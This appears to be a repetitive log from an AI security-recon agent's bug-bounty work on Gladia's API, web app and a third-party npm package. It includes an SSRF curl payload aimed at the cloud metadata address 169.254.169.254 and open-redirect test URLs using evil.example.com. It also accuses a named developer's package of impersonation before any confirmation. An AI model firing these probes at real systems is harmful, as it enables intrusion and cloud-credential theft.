[FINAL] 1) Orphaned npm package gladia@0.1.3 actively impersonates official SDK with API key leakage in WebSocket URL (npm registry, 95, OTHER) 2) SSRF via audio_url/video_url/callback_url server-side fetch (api.gladia.io, 73, SSRF) 3) Post-auth open redirect via reflected redirect_to on signin form action (app.gladia.io, 65, OATH)
[NEXT] HUMAN: Phase is POC, target is app. Complete Google OAuth flow on app.gladia.io/signin?redirect_to=https://evil.example.com and observe final redirect target post-auth — sole unverified gate for top app hypothesis.
[LEARN] ACCEPTED MISCONFIG @ api.gladia.io: structural hash (examples-stripped) stable at sha256 9a326c924644b59854b0cafddb5f477c23d6d1cfb8c220f0ff5bf689c3c61c7b across 3 fetches — validated drift baseline replacing byte-hash
[LEARN] REJECTED MISCONFIG @ api.gladia.io: per-instance codegen fingerprint hypothesis falsified — 3 fresh fetches returned 3 distinct example timestamps (25.976/32.264/26.548Z) beyond prior values; dynamic examples are deploy-window artifact not instance identity
[LEARN] REJECTED MISCONFIG @ api.gladia.io: NO_DRIFT this cycle (10:16 UTC) — openapi 125131B/14 paths, /health 15B, /v1/models 530B FR/US, preflight-only x-powered-by differential, CORS static wildcard — surface frozen
[LEARN] ACCEPTED OTHER @ npm gladia@0.1.3: orphaned impersonation confirmed — source repo alexisbouchez/gladia.ts + user 404 while dist-tag latest persists (fresh 10:16 UTC)
[LEARN] ACCEPTED MISCONFIG @ api.gladia.io: NO_DRIFT across 9 cycles (23:08→10:16 UTC) — OpenAPI 125131B/14 paths, /health 15B, /v1/models 530B, preflight-only x-powered-by differential, CORS static wildcard, key-gated v2 surface frozen
[LEARN] ACCEPTED SSRF @ api.gladia.io: spec+RAG unchanged 10:16 UTC; audio_url/video_url/callback_url/CallbackConfig.url all `format:uri` no scheme allowlist; /v1/models confirms FR+US egress — SSRF-by-design fetch surface remains live, gated only by key (AUTH_HELPED)
[LEARN] ACCEPTED OATH @ app.gladia.io: /signin?redirect_to= reflection confirmed alive 10:16 UTC — form action reflects URL-encoded value; no host allowlist at unauthenticated layer; CSP lacks form-action; post-auth honoring still AUTH_HELPED
[LEARN] ACCEPTED MISCONFIG @ app.gladia.io: /dashboard returns 200 (SPA shell) without auth at 10:16 UTC — client-side enforcement confirmed; server-side 302 gate on /apikeys and /transcriptions intact
[RISK] api.gladia.io: 85 reason: Public OpenAPI spec reveals full attack surface; CORS wildcard with auth header allowed; WebSocket token-in-URL design; undocumented /health endpoint; NestJS-on-Express backend; high business value; potential SSRF via audio_url/video_url/callback_url with no scheme validation; datacenter regions exposed
[RISK] app.gladia.io: 65 reason: Dashboard SPA served without auth (client-side enforcement); return-to cookie validated server-side; redirect_to reflected in form action without host allowlist; CSP lacks form-action directive; Google-only OAuth limits exploitability but post-auth honoring unverified; HSTS preload strong
[RISK] sdk: 85 reason: Official SDKs (@gladiaio/sdk 1.1.0, gladiaio-sdk 1.0.5) generated from public spec; third-party gladia@0.1.3 ownership anomaly escalated to orphaned impersonation with API key leakage in WS URL; PyPI version static; supply-chain risk increased
[PRIO] api.gladia.io POST /v2/pre-recorded (SSRF fetch surface): score 6.75 | attack 8 business 8 tech 7 gate 2 cloud 8 fresh 6
[PRIO] npm registry `gladia`@0.1.3 (orphaned impersonation): score 6.55 | attack 6 business 7 tech 6 gate 10 cloud 1 fresh 8
[PRIO] app.gladia.io /signin (redirect_to reflection/OATH): score 5.80 | attack 6 business 6 tech 6 gate 8 cloud 1 fresh 6
[HYP] SSRF via audio_url/video_url/callback_url server-side fetch
class: SSRF
asset: api.gladia.io POST /v2/pre-recorded (+ /video/text/video-transcription, callback_config)
confidence: 73
reasoning: spec unchanged 10th cycle — URL fields `format:uri` no scheme allowlist; SDK forwards verbatim (packages/sdk-js/client.ts, sdk-python/v2/prerecorded/core.py); /v1/models confirms FR/US egress; key is sole gate.
evidence_needed: key-gated fetch of 169.254.169.254/internal host reflected in error/status/duration, or callback observed at internal listener.
verify_steps: AUTH_HELPED — with authorized x-gladia-key POST /v2/pre-recorded {"audio_url":"http://<canary>"} then {"audio_url":"http://169.254.169.254/latest/meta-data/"}; repeat video_url + callback_config.url; run ≥2x to cover dual-instance egress pool.
impact: cloud-metadata + internal-network read from API origin → High (key-gated)
testability: AUTH_HELPED
[HYP] `gladia`@0.1.3 orphaned impersonation at dist-tag latest
class: OTHER
asset: npm registry `gladia` 0.1.3
confidence: 95
reasoning: dist-tag latest=0.1.3; shasum `cc96f84a…` unchanged; repo alexisbouchez/gladia.ts + user 404; README "Unofficial" vs package.json "Official" same artifact; client.ts:307 raw x-gladia-key in WS query.
evidence_needed: none at registry level — artifact contradiction + orphan verified; affiliation verdict pending Gladia.
verify_steps: PASSIVE — done (npm view, tarball sha256 `3b23ec7d…7f2`, GitHub API 404); submission is the only remaining step.
impact: devs run unofficial code with raw API keys in WS URLs (access-log/proxy capture) → Medium impersonation + Medium key hygiene
testability: PASSIVE
[HYP] redirect_to honored post-auth to external host (open redirect / OAuth redirect_uri injection)
class: OATH
asset: app.gladia.io /signin
confidence: 60
reasoning: reflection re-confirmed across cycles (form action URL-encodes redirect_to); dual email-password + Google SSO intent paths; protected routes real server-side 302; unsigned return-to cookie.
evidence_needed: post-auth 302 Location to external host, or redirect_to reused as OAuth redirect_uri.
verify_steps: AUTH_HELPED — complete Google SSO with ?redirect_to=https://evil.example.com + //evil + app.gladia.io.evil variants; capture post-auth Location + Set-Cookie; test redirect_to-as-redirect_uri.
impact: post-auth phishing redirect; OAuth code/state theft if redirect_uri injectable → Medium (High if proven)
testability: AUTH_HELPED
[FINAL] re-ranked: 1) npm `gladia`@0.1.3 impersonation (95, submission-ready) 2) api SSRF-by-design (73, key-gated) 3) app redirect_to OATH (60, AUTH_HELPED, weakest).
[PARKED] none dropped — all ≥40, none on REJECTED list, all have concrete verify_steps.
[NEXT] HUMAN: Submit the `gladia`@0.1.3 report via gladia.io/bug-bounty-report Google Form (tarball sha256 `3b23ec7d7a763abc04c52db232d157a982fd3bd969c9f703af3eecad5fa802f2`, shasum `cc96f84a…`, README "Unofficial" vs package.json "Official" in same artifact, source repo+account 404 orphaned, client.ts:307 raw x-gladia-key in WS URL) and request an authorized `x-gladia-key` for a self-own-data SSRF canary (http://169.254.169.254/latest/meta-data/); run the canary ≥2x to cover the dual-instance egress pool. Standing gate for the top api finding.
[LEARN] ACCEPTED MISCONFIG @ api.gladia.io: NO_DRIFT across 10 cycles (23:08→current) — openapi 125131B/14 paths, /health 15B, /v1/models 530B FR/US, preflight-only x-powered-by differential, CORS static wildcard — surface frozen, nothing new to report
[LEARN] ACCEPTED OTHER @ npm gladia@0.1.3: impersonation persists — shasum `cc96f84a…` unchanged, repo alexisbouchez/gladia.ts + user 404 (orphaned), @gladiaio/sdk@1.1.0 static (fresh this cycle)
[RISK] api.gladia.io: 45 — frozen 14-path key-gated surface with SSRF-by-design fetch fields (audio_url/video_url/callback_url) gated solely by key; drift baseline validated across 10 cycles but no proven exploitable path without a key | app.gladia.io: 35 — unauth redirect_to reflection confirmed, post-auth honoring unproven; dual auth path widens redirect_uri surface; no confirmed vuln | sdk: 50 — orphaned `gladia`@0.1.3 at dist-tag latest with raw-API-key-in-WS-URL pattern (report ready); official @gladiaio/sdk@1.1.0 clean, tarball unchanged
[PRIO] app.gladia.io, 6.9, attack_surface=7 business_value=8 tech_exposure=6 gate_ease=6 cloud_surface=6 freshness=7
[PRIO] api.gladia.io, 8.6, attack_surface=9 business_value=9 tech_exposure=8 gate_ease=10 cloud_surface=8 freshness=6
[PRIO] npm registry (gladia@0.1.3), 8.3, attack_surface=9 business_value=8 tech_exposure=8 gate_ease=10 cloud_surface=3 freshness=10
[HYP] Post-auth open redirect via reflected redirect_to on signin form action
class: OATH
asset: app.gladia.io
confidence: 65
reasoning: /signin?redirect_to= reflects value into form action for https://, //, bare-host, confusing-subdomain (app.gladia.io.evil), path-only variants — confirmed live 10:16 UTC; CSP lacks form-action directive restricting POST targets; Google-only OAuth limits exploitability but no host allowlist enforced on reflection at unauthenticated layer; post-auth honoring unverified (AUTH_HELPED)
evidence_needed: Confirm server-side validation of redirect_to against allowlist post-Google-OAuth; test if arbitrary external domains accepted after successful auth
verify_steps: HUMAN: Complete Google OAuth flow on app.gladia.io/signin?redirect_to=https://evil.example.com and observe final redirect target
impact: Post-auth open redirect to arbitrary domain; severity Low-Medium (requires user interaction + Google auth)
testability: HUMAN_ONLY
[HYP] SSRF via audio_url/video_url/callback_url server-side fetch
class: SSRF
asset: api.gladia.io
confidence: 73
reasoning: OpenAPI spec confirms /v2/pre-recorded and /v2/live accept audio_url/video_url/callback_url as format:uri with no scheme allowlist; /v1/models exposes FR/US datacenter regions for egress targeting; NestJS-on-Express backend likely follows redirects; SDK source confirms no host allowlist/metadata-blocklist/redirect-limit validation forwarded to API
evidence_needed: Confirm server-side fetch behavior with internal metadata URLs (169.254.169.254), localhost, private CIDRs; verify redirect following and callback_url SSRF
verify_steps: AUTH_HELPED: POST https://api.gladia.io/v2/pre-recorded -H "x-gladia-key: <valid_key>" -H "Content-Type: application/json" -d '{"audio_url":"http://169.254.169.254/latest/meta-data/","callback_url":"http://169.254.169.254/latest/meta-data/"}'
impact: Cloud metadata access, internal service enumeration, potential data exfiltration via callback; severity High
testability: AUTH_HELPED
[HYP] Orphaned npm package gladia@0.1.3 actively impersonates official SDK with API key leakage in WebSocket URL
class: OTHER
asset: npm registry (gladia@0.1.3)
confidence: 95
reasoning: Package claims "Official TypeScript SDK" but source repo alexisbouchez/gladia.ts + user account 404 (orphaned); tarball sha256 3b23ec7d7a763abc04c52db232d157a982fd3bd969c9f703af3eecad5fa802f2 contains README "Unofficial" vs package.json "Official" contradiction; src/client.ts:307 embeds raw x-gladia-key into wss://api.gladia.io/v2/live?token=<key> query parameter — diverges from official SDK's token-after-init design, leaks key in URLs/logs/proxies
evidence_needed: Document artifact-level findings (tarball hash, README vs package.json contradiction, WS key leakage code path); confirm no affiliation with Gladia
verify_steps: RAG: Finalize report with tarball sha256 3b23ec7d7a763abc04c52db232d157a982fd3bd969c9f703af3eecad5fa802f2, README "Unofficial" vs package.json "Official", client.ts:307 key-in-URL; HUMAN: Request Gladia security confirm no affiliation with alexisbouchez/softwarecitadel
impact: Supply chain risk — developers install impersonated SDK leading to credential theft via key-in-URL logs/proxies; severity High
testability: RAG
[PARKED] None — all three hypotheses meet confidence ≥40, have concrete verify_steps, and are not on REJECTED list.
[FINAL] 1) Orphaned npm package gladia@0.1.3 actively impersonates official SDK with API key leakage in WebSocket URL (npm registry, 95, OTHER) 2) SSRF via audio_url/video_url/callback_url server-side fetch (api.gladia.io, 73, SSRF) 3) Post-auth open redirect via reflected redirect_to on signin form action (app.gladia.io, 65, OATH)
[NEXT] HUMAN: Phase is POC, target is app. Complete Google OAuth flow on app.gladia.io/signin?redirect_to=https://evil.example.com and observe final redirect target post-auth — sole unverified gate for top app hypothesis.
[LEARN] ACCEPTED MISCONFIG @ api.gladia.io: structural hash (examples-stripped) stable at sha256 9a326c924644b59854b0cafddb5f477c23d6d1cfb8c220f0ff5bf689c3c61c7b across 3 fetches — validated drift baseline replacing byte-hash
[LEARN] REJECTED MISCONFIG @ api.gladia.io: per-instance codegen fingerprint hypothesis falsified — 3 fresh fetches returned 3 distinct example timestamps (25.976/32.264/26.548Z) beyond prior values; dynamic examples are deploy-window artifact not instance identity
[LEARN] REJECTED MISCONFIG @ api.gladia.io: NO_DRIFT this cycle (10:16 UTC) — openapi 125131B/14 paths, /health 15B, /v1/models 530B FR/US, preflight-only x-powered-by differential, CORS static wildcard — surface frozen
[LEARN] ACCEPTED OTHER @ npm gladia@0.1.3: orphaned impersonation confirmed — source repo alexisbouchez/gladia.ts + user 404 while dist-tag latest persists (fresh 10:16 UTC)
[LEARN] ACCEPTED MISCONFIG @ api.gladia.io: NO_DRIFT across 9 cycles (23:08→10:16 UTC) — OpenAPI 125131B/14 paths, /health 15B, /v1/models 530B, preflight-only x-powered-by differential, CORS static wildcard, key-gated v2 surface frozen
[LEARN] ACCEPTED SSRF @ api.gladia.io: spec+RAG unchanged 10:16 UTC; audio_url/video_url/callback_url/CallbackConfig.url all `format:uri` no scheme allowlist; /v1/models confirms FR+US egress — SSRF-by-design fetch surface remains live, gated only by key (AUTH_HELPED)
[LEARN] ACCEPTED OATH @ app.gladia.io: /signin?redirect_to= reflection confirmed alive 10:16 UTC — form action reflects URL-encoded value; no host allowlist at unauthenticated layer; CSP lacks form-action; post-auth honoring still AUTH_HELPED
[LEARN] ACCEPTED MISCONFIG @ app.gladia.io: /dashboard returns 200 (SPA shell) without auth at 10:16 UTC — client-side enforcement confirmed; server-side 302 gate on /apikeys and /transcriptions intact
[RISK] api.gladia.io: 85 reason: Public OpenAPI spec reveals full attack surface; CORS wildcard with auth header allowed; WebSocket token-in-URL design; undocumented /health endpoint; NestJS-on-Express backend; high business value; potential SSRF via audio_url/video_url/callback_url with no scheme validation; datacenter regions exposed
[RISK] app.gladia.io: 65 reason: Dashboard SPA served without auth (client-side enforcement); return-to cookie validated server-side; redirect_to reflected in form action without host allowlist; CSP lacks form-action directive; Google-only OAuth limits exploitability but post-auth honoring unverified; HSTS preload strong
[RISK] sdk: 85 reason: Official SDKs (@gladiaio/sdk 1.1.0, gladiaio-sdk 1.0.5) generated from public spec; third-party gladia@0.1.3 ownership anomaly escalated to orphaned impersonation with API key leakage in WS URL; PyPI version static; supply-chain risk increased
[PRIO] api.gladia.io POST /v2/pre-recorded (SSRF fetch surface): score 6.75 | attack 8 business 8 tech 7 gate 2 cloud 8 fresh 6
[PRIO] npm registry `gladia`@0.1.3 (orphaned impersonation): score 6.55 | attack 6 business 7 tech 6 gate 10 cloud 1 fresh 8
[PRIO] app.gladia.io /signin (redirect_to reflection/OATH): score 5.80 | attack 6 business 6 tech 6 gate 8 cloud 1 fresh 6
[HYP] SSRF via audio_url/video_url/callback_url server-side fetch
class: SSRF
asset: api.gladia.io POST /v2/pre-recorded (+ /video/text/video-transcription, callback_config)
confidence: 73
reasoning: spec unchanged 10th cycle — URL fields `format:uri` no scheme allowlist; SDK forwards verbatim (packages/sdk-js/client.ts, sdk-python/v2/prerecorded/core.py); /v1/models confirms FR/US egress; key is sole gate.
evidence_needed: key-gated fetch of 169.254.169.254/internal host reflected in error/status/duration, or callback observed at internal listener.
verify_steps: AUTH_HELPED — with authorized x-gladia-key POST /v2/pre-recorded {"audio_url":"http://<canary>"} then {"audio_url":"http://169.254.169.254/latest/meta-data/"}; repeat video_url + callback_config.url; run ≥2x to cover dual-instance egress pool.
impact: cloud-metadata + internal-network read from API origin → High (key-gated)
testability: AUTH_HELPED
[HYP] `gladia`@0.1.3 orphaned impersonation at dist-tag latest
class: OTHER
asset: npm registry `gladia` 0.1.3
confidence: 95
reasoning: dist-tag latest=0.1.3; shasum `cc96f84a…` unchanged; repo alexisbouchez/gladia.ts + user 404; README "Unofficial" vs package.json "Official" same artifact; client.ts:307 raw x-gladia-key in WS query.
evidence_needed: none at registry level — artifact contradiction + orphan verified; affiliation verdict pending Gladia.
verify_steps: PASSIVE — done (npm view, tarball sha256 `3b23ec7d…7f2`, GitHub API 404); submission is the only remaining step.
impact: devs run unofficial code with raw API keys in WS URLs (access-log/proxy capture) → Medium impersonation + Medium key hygiene
testability: PASSIVE
[HYP] redirect_to honored post-auth to external host (open redirect / OAuth redirect_uri injection)
class: OATH
asset: app.gladia.io /signin
confidence: 60
reasoning: reflection re-confirmed across cycles (form action URL-encodes redirect_to); dual email-password + Google SSO intent paths; protected routes real server-side 302; unsigned return-to cookie.
evidence_needed: post-auth 302 Location to external host, or redirect_to reused as OAuth redirect_uri.
verify_steps: AUTH_HELPED — complete Google SSO with ?redirect_to=https://evil.example.com + //evil + app.gladia.io.evil variants; capture post-auth Location + Set-Cookie; test redirect_to-as-redirect_uri.
impact: post-auth phishing redirect; OAuth code/state theft if redirect_uri injectable → Medium (High if proven)
testability: AUTH_HELPED
[FINAL] re-ranked: 1) npm `gladia`@0.1.3 impersonation (95, submission-ready) 2) api SSRF-by-design (73, key-gated) 3) app redirect_to OATH (60, AUTH_HELPED, weakest).
[PARKED] none dropped — all ≥40, none on REJECTED list, all have concrete verify_steps.
[NEXT] HUMAN: Submit the `gladia`@0.1.3 report via gladia.io/bug-bounty-report Google Form (tarball sha256 `3b23ec7d7a763abc04c52db232d157a982fd3bd969c9f703af3eecad5fa802f2`, shasum `cc96f84a…`, README "Unofficial" vs package.json "Official" in same artifact, source repo+account 404 orphaned, client.ts:307 raw x-gladia-key in WS URL) and request an authorized `x-gladia-key` for a self-own-data SSRF canary (http://169.254.169.254/latest/meta-data/); run the canary ≥2x to cover the dual-instance egress pool. Standing gate for the top api finding.
[LEARN] ACCEPTED MISCONFIG @ api.gladia.io: NO_DRIFT across 10 cycles (23:08→current) — openapi 125131B/14 paths, /health 15B, /v1/models 530B FR/US, preflight-only x-powered-by differential, CORS static wildcard — surface frozen, nothing new to report
[LEARN] ACCEPTED OTHER @ npm gladia@0.1.3: impersonation persists — shasum `cc96f84a…` unchanged, repo alexisbouchez/gladia.ts + user 404 (orphaned), @gladiaio/sdk@1.1.0 static (fresh this cycle)
[RISK] api.gladia.io: 45 — frozen 14-path key-gated surface with SSRF-by-design fetch fields (audio_url/video_url/callback_url) gated solely by key; drift baseline validated across 10 cycles but no proven exploitable path without a key | app.gladia.io: 35 — unauth redirect_to reflection confirmed, post-auth honoring unproven; dual auth path widens redirect_uri surface; no confirmed vuln | sdk: 50 — orphaned `gladia`@0.1.3 at dist-tag latest with raw-API-key-in-WS-URL pattern (report ready); official @gladiaio/sdk@1.1.0 clean, tarball unchanged
[CHANGED] app.gladia.io CSP confirmed: base-uri 'self', object-src 'none', frame-src 'self'+*.gladia.io+billing+svix; NO form-action directive (gap enables unconstrained form-action reflection)
[PRIO] app.gladia.io /signin?redirect_to= reflected form action + CSP form-action gap, 6.5, attack_surface=6 business_value=8 tech_exposure=6 gate_ease=7 cloud_surface=2 freshness=9
[PRIO] app.gladia.io /dashboard & /org SPA 200 without auth (client-side enforcement), 5.1, attack_surface=4 business_value=5 tech_exposure=3 gate_ease=9 cloud_surface=2 freshness=9
[HYP] app.gladia.io /signin post-auth open redirect via reflected redirect_to + CSP form-action gap
class: OATH
asset: app.gladia.io /signin?redirect_to=
confidence: 65
reasoning: GET /signin?redirect_to=<ext> → 200, form action="/signin?redirect_to=<url-encoded ext>"; reflected for https://, //, bare-host, app.gladia.io.evil, path-only — no host allowlist at unauth layer (fresh 11:36 UTC); POST /signin intent=google carries redirect_to into OAuth init (302→accounts.google.com), redirect_uri FIXED (no inject) — confirms reflection is on the auth path; CSP has base-uri 'self' + object-src 'none' but NO form-action directive (fresh confirmed)
evidence_needed: post-auth 302 Location to https://evil.example.com after completing Google OAuth (or email/password) with redirect_to set; prove server honors arbitrary host (not resets like return-to cookie)
verify_steps: AUTH_HELPED / HUMAN_ONLY — complete Google OAuth (or email/password signin) on app.gladia.io/signin?redirect_to=https://evil.example.com + //evil + app.gladia.io.evil + /dashboard variants; capture final 302 Location + Set-Cookie; contrast against tamper-rejected return-to cookie
impact: Post-auth open redirect to attacker host → phishing/brand-spoof after victim authenticates; OAuth code NOT stealable (redirect_uri fixed). Medium (requires victim interaction + auth)
testability: HUMAN_ONLY
[HYP] app.gladia.io /dashboard & /org SPA served 200 without auth (client-side enforcement)
class: MISCONFIG
asset: app.gladia.io /dashboard, /org
confidence: 35
reasoning: GET /dashboard & /org → 200 text/html SPA shell without __sid; server-side 302 gate intact only on /apikeys,/transcriptions,/settings (confirmed 302→/signin + return-to cookie). Pure client-side route guard — by-design for SPA
evidence_needed: unauthenticated API call from SPA returning authenticated data (e.g. /api/me returning 200 JSON user data without cookie)
verify_steps: PASSIVE — probe /dashboard + /org + common SPA API endpoints without cookie; observe if any returns protected JSON (not HTML shell)
impact: Low — SPA shell exposure is standard; real gate is API auth on api.gladia.io
testability: PASSIVE
[PARKED] app.gladia.io /dashboard SPA 200 (MISCONFIG, conf 35): below 40 confidence + by-design SPA pattern; no protected JSON reachable at unauth layer → dropped from FINAL
[FINAL] 1) app.gladia.io /signin post-auth open redirect via reflected redirect_to + CSP form-action gap (OATH, 65, HUMAN_ONLY) — sole unverified gate is post-auth honoring (auth flow completion)
[NEXT] HUMAN: With program authorization, complete the Google OAuth (or email/password) signin on app.gladia.io/signin?redirect_to=https://evil.example.com and capture the final 302 Location — this is the sole unverified gate for the app OATH finding; if no authorized Google test-account is available, request a Gladia-issued test credential / sandbox account to complete the email-password flow and observe post-auth redirect honoring. Passive re-probes confirm nothing new until post-auth honoring is verified.
[LEARN] ACCEPTED OATH @ app.gladia.io: POST /signin intent=google initiates OAuth carrying redirect_to (302→accounts.google.com) at unauth layer — reflection confirmed on the auth-initiation path, not just form action (fresh 11:36 UTC)
[LEARN] REJECTED OATH @ app.gladia.io: redirect_to is NOT usable as OAuth redirect_uri — server uses fixed redirect_uri=https://app.gladia.io/auth/google/callback → no OAuth code/state theft via redirect_to; narrows finding to post-auth honoring only
[LEARN] ACCEPTED MISCONFIG @ app.gladia.io: CSP directive set verified fresh — base-uri 'self', object-src 'none', frame-src 'self'+allowlist; form-action directive ABSENT → unconstrained form-action reflection (CSP gap confirmed, not an oversight)
[LEARN] CONFIRMED MISCONFIG @ app.gladia.io: /dashboard & /org + /api,/oauth,/auth,/oid4,/api/v1,/api/health,/api/me all return 200 text/html (SPA catch-all) — no real authenticated API lives on app host; server-side 302 gate intact on /apikeys,/transcriptions,/settings (return-to cookie tamper-reset confirmed)
[RISK] api.gladia.io: 85 — public OpenAPI 14 paths; CORS * + ACAH x-gladia-key (no creds); NestJS-on-Express; /health undocumented; SSRF-by-design audio_url/video_url/callback_url format:uri no scheme allowlist (FR/US egress via public /v1/models); preflight-only x-powered-by fingerprint — surface frozen/NO_DRIFT 9+ cycles
[RISK] app.gladia.io: 65 — Google OAuth (redirect_uri fixed, NOT injectable); SPA /dashboard 200 client-side; /signin redirect_to reflected to arbitrary host no allowlist + CSP NO form-action (gap); return-to cookie tamper-reset (REJECTED as redirect vector); post-auth honoring unverified = sole gate; HSTS preload strong
[RISK] sdk: 75 — official @gladiaio/sdk@1.1.0 + PyPI gladiaio-sdk 1.0.5 clean; npm gladia@0.1.3 orphaned impersonation (description "Official", repo/user 404, sha256 3b23ec7d…7f2, client.ts:307 raw x-gladia-key in wss URL query) at dist-tag latest — supply-chain deception + key leakage in WS URL/logs
[HYP] app.gladia.io /signin post-auth open redirect via reflected redirect_to + CSP form-action gap
class: OATH | asset: app.gladia.io /signin?redirect_to= | confidence: 65
reasoning: GET /signin?redirect_to=<ext> → 200 form action="/signin?redirect_to=<enc ext>"; reflected for https://,//,bare-host,app.gladia.io.evil,/dashboard — no host allowlist at unauth layer (fresh 11:36); POST intent=google carries redirect_to into OAuth init with FIXED redirect_uri (no inject); CSP base-uri 'self'+object-src 'none' but NO form-action (fresh)
evidence_needed: post-auth 302 Location to https://evil.example.com after completing signin with redirect_to set (not reset like return-to cookie)
verify_steps: AUTH_HELPED/HUMAN_ONLY — complete Google OAuth + email/password on /signin?redirect_to=https://evil.example.com (+//evil,+app.gladia.io.evil,+/dashboard); capture final 302 Location+Set-Cookie; contrast tamper-rejected return-to cookie
impact: Post-auth open redirect → phishing/brand-spoof after victim auth. OAuth code NOT stealable (redirect_uri fixed). Medium.
testability: HUMAN_ONLY
[HYP] app.gladia.io /dashboard & /org SPA served 200 without auth (client-side enforcement)
class: MISCONFIG | asset: app.gladia.io /dashboard,/org | confidence: 35
reasoning: GET → 200 text/html SPA shell; server-side 302 gate intact only on /apikeys,/transcriptions,/settings
evidence_needed: unauth API call returning protected JSON (not HTML shell)
verify_steps: PASSIVE — /dashboard+/org+SPA API endpoints without cookie
impact: Low — by-design; real gate is API auth on api.gladia.io
testability: PASSIVE
[PARKED] app.gladia.io /dashboard SPA 200 (MISCONFIG, conf 35): below 40 + by-design SPA; no protected JSON at unauth layer → dropped
[FINAL] 1) app.gladia.io /signin post-auth open redirect via reflected redirect_to + CSP form-action gap (OATH, 65, HUMAN_ONLY) — sole gate = post-auth honoring (auth-flow completion)
[NEXT] HUMAN: With program authorization, complete Google OAuth (or email/password) signin on app.gladia.io/signin?redirect_to=https://evil.example.com and capture the final 302 Location — sole unverified gate for the app OATH finding; if no Google test-account available, request a Gladia-issued test credential/sandbox account to run the email-password flow and observe post-auth redirect honoring.
## 2026-08-08 12:03:32 UTC [app] (model laguna)
## 2026-08-08 13:11:39 UTC [app] (model laguna)
[PRIO] api.gladia.io, 8.6, attack_surface=9 business_value=9 tech_exposure=8 gate_ease=10 cloud_surface=8 freshness=6
[PRIO] npm registry (gladia@0.1.3), 8.3, attack_surface=9 business_value=8 tech_exposure=8 gate_ease=10 cloud_surface=3 freshness=10
[PRIO] app.gladia.io, 6.9, attack_surface=7 business_value=8 tech_exposure=6 gate_ease=6 cloud_surface=6 freshness=7
[HYP] Orphaned npm package gladia@0.1.3 actively impersonates official SDK with API key leakage in WebSocket URL
class: OTHER
asset: npm registry (gladia@0.1.3)
confidence: 95
reasoning: Package claims "Official TypeScript SDK" but source repo alexisbouchez/gladia.ts + user account 404 (orphaned); tarball sha256 3b23ec7d7a763abc04c52db232d157a982fd3bd969c9f703af3eecad5fa802f2 contains README "Unofficial" vs package.json "Official" contradiction; src/client.ts:307 embeds raw x-gladia-key into wss://api.gladia.io/v2/live?token=<key> query parameter — diverges from official SDK's token-after-init design, leaks key in URLs/logs/proxies
evidence_needed: Document artifact-level findings (tarball hash, README vs package.json contradiction, WS key leakage code path); confirm no affiliation with Gladia
verify_steps: RAG: Finalize report with tarball sha256 3b23ec7d7a763abc04c52db232d157a982fd3bd969c9f703af3eecad5fa802f2, README "Unofficial" vs package.json "Official", client.ts:307 key-in-URL; HUMAN: Request Gladia security confirm no affiliation with alexisbouchez/softwarecitadel
impact: Supply chain risk — developers install impersonated SDK leading to credential theft via key-in-URL logs/proxies; severity High
testability: RAG
[HYP] SSRF via audio_url/video_url/callback_url server-side fetch
class: SSRF
asset: api.gladia.io
confidence: 73
reasoning: OpenAPI spec confirms /v2/pre-recorded and /v2/live accept audio_url/video_url/callback_url as format:uri with no scheme allowlist; /v1/models exposes FR/US datacenter regions for egress targeting; NestJS-on-Express backend likely follows redirects; SDK source confirms no host allowlist/metadata-blocklist/redirect-limit validation forwarded to API
evidence_needed: Confirm server-side fetch behavior with internal metadata URLs (169.254.169.254), localhost, private CIDRs; verify redirect following and callback_url SSRF
verify_steps: AUTH_HELPED: POST https://api.gladia.io/v2/pre-recorded -H "x-gladia-key: <valid_key>" -H "Content-Type: application/json" -d '{"audio_url":"http://169.254.169.254/latest/meta-data/","callback_url":"http://169.254.169.254/latest/meta-data/"}'
impact: Cloud metadata access, internal service enumeration, potential data exfiltration via callback; severity High
testability: AUTH_HELPED
[HYP] Post-auth open redirect via reflected redirect_to on signin form action
class: OATH
asset: app.gladia.io
confidence: 65
reasoning: /signin?redirect_to= reflects value into form action for https://, //, bare-host, confusing-subdomain (app.gladia.io.evil), path-only variants — confirmed live 11:36 UTC; CSP lacks form-action directive restricting POST targets; Google-only OAuth limits exploitability but no host allowlist enforced on reflection at unauthenticated layer; post-auth honoring unverified (AUTH_HELPED)
evidence_needed: Confirm server-side validation of redirect_to against allowlist post-Google-OAuth; test if arbitrary external domains accepted after successful auth
verify_steps: HUMAN: Complete Google OAuth flow on app.gladia.io/signin?redirect_to=https://evil.example.com and observe final redirect target
impact: Post-auth open redirect to arbitrary domain; severity Low-Medium (requires user interaction + Google auth)
testability: HUMAN_ONLY
[PARKED] None — all three hypotheses meet confidence ≥40, have concrete verify_steps, and are not on REJECTED list.
[FINAL] 1) Orphaned npm package gladia@0.1.3 actively impersonates official SDK with API key leakage in WebSocket URL (npm registry, 95, OTHER) 2) SSRF via audio_url/video_url/callback_url server-side fetch (api.gladia.io, 73, SSRF) 3) Post-auth open redirect via reflected redirect_to on signin form action (app.gladia.io, 65, OATH)
[NEXT] HUMAN: Phase is POC, target is app. Complete Google OAuth flow on app.gladia.io/signin?redirect_to=https://evil.example.com and observe final redirect target post-auth — sole unverified gate for top app hypothesis.
[LEARN] ACCEPTED MISCONFIG @ api.gladia.io: NO_DRIFT across 11 cycles (23:08→11:36 UTC) — openapi 125131B/14 paths, /health 15B, /v1/models 530B FR/US, preflight-only x-powered-by differential, CORS static wildcard — surface frozen
[LEARN] ACCEPTED OATH @ app.gladia.io: /signin?redirect_to= reflection confirmed alive 11:36 UTC — form action reflects URL-encoded value; no host allowlist at unauthenticated layer; CSP lacks form-action; post-auth honoring still AUTH_HELPED
[LEARN] ACCEPTED OTHER @ npm gladia@0.1.3: orphaned impersonation confirmed — shasum cc96f84a… unchanged, repo alexisbouchez/gladia.ts + user 404 while dist-tag latest persists (fresh 11:37 UTC)
[LEARN] ACCEPTED MISCONFIG @ app.gladia.io: CSP directive set verified fresh — base-uri 'self', object-src 'none', frame-src 'self'+allowlist; form-action directive ABSENT → unconstrained form-action reflection (CSP gap confirmed, not an oversight)
[LEARN] CONFIRMED MISCONFIG @ app.gladia.io: /dashboard & /org + /api,/oauth,/auth,/oid4,/api/v1,/api/health,/api/me all return 200 text/html (SPA catch-all) — no real authenticated API lives on app host; server-side 302 gate intact on /apikeys,/transcriptions,/settings (return-to cookie tamper-reset confirmed)
[LEARN] REJECTED OATH @ app.gladia.io: redirect_to is NOT usable as OAuth redirect_uri — server uses fixed redirect_uri=https://app.gladia.io/auth/google/callback → no OAuth code/state theft via redirect_to; narrows finding to post-auth honoring only
